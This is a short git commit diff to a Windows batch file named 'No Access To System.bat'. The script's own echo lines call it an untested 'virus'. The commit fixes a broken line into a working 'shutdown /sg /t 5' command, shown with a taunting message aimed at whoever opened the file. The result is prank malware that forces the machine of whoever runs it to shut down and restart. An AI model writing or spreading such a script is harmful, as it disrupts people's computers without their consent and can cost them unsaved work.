ca9c3a6989f7f27dcb5ce07eccc112a99aa58525
GioyeTheDev <138115736+GioyeTheDev@users.noreply.github.com>
2023-07-08 18:34:29 +0200

    Update No Access To System.bat

--- No Access To System.bat
+++ No Access To System.bat
@@ -4,4 +4,4 @@ echo or it will be useless.
 echo this virus didn't never ever got tested.
 pause
 echo die at your risk.
-/sg /t 5 /c YOU ARE A IDIOT! HAHAHAHAHAHAHAHA! WHY DID YOU OPEN ME? LET ME SLEEP!
+shutdown /sg /t 5 /c YOU ARE A IDIOT! HAHAHAHAHAHAHAHA! WHY DID YOU OPEN ME? LET ME SLEEP!
